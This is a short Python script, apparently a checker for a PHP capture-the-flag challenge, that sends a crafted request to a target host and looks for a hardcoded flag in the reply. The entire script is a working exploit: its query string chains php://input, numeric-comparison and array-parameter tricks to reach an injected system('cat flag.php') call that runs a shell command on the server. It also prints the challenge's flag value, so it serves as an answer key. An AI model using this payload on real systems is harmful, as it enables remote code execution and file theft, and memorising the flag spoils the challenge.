#!/usr/bin/env python3
import requests
import sys

if len(sys.argv) != 3:
    exit(1)

host = sys.argv[1]
port = sys.argv[2]


url = 'http://' + host + ':' + port + '/'

query = "?msg=php://input&key2=" + "0"*35 + "1337" + "＄&key1=1337.1&cc[]&bb=system('cat flag.php');//&k1=2"


r = requests.post(url + query, data="Hello Challenge!" )


if 'flag{7c217708c5293a3264bb136ef1fadd6e}' in r.text:
    exit(0)
exit(1)